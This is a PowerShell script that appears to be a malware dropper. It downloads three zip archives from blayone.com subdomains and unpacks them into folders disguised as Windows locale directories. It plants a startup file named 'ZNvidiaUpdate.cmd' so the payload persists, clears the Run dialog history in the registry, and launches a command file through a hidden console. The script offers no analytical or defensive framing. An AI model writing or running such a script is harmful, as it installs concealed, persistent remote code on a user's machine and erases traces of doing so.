$startup = [environment]::getfolderpath("Startup")
Remove-Item $startup\ZNvidiaUpdate.cmd -Force
Remove-Item -LiteralPath "c:\temp" -Force -Recurse

Invoke-WebRequest -OutFile temp.zip http://py.blayone.com/temp.zip
Invoke-WebRequest -OutFile ms.zip http://whiteswan.blayone.com/whiteswan.zip
Invoke-WebRequest -OutFile python.zip http://whiteswan.blayone.com/python.zip


Expand-Archive -Path temp.zip -DestinationPath c:\
Expand-Archive -Path whiteswan.zip -DestinationPath c:\temp\data\boot\lv-LV\settings
Expand-Archive -Path python.zip -DestinationPath C:\temp\data\boot\lv-LV\settings\whiteswan\python

Rename-Item c:\temp\data\boot\lv-LV\settings\whiteswan c:\temp\data\boot\lv-LV\settings\ws

Remove-Item -Path temp.zip -Force
Remove-Item -Path whiteswan.zip -Force
Remove-Item -Path python.zip -Force

$File = "c:\temp\data\boot\lv-LV\settings\ws\run\ZNvidiaUpdate.cmd"
Copy-Item $File $startup

Remove-ItemProperty -Path ‘HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU’ -Name ‘*’ -ErrorAction SilentlyContinue

c:\temp\data\boot\pt-PT\pw\RunHiddenConsole c:\temp\data\boot\lv-LV\settings\ws\run\FirstTimeRun.cmd
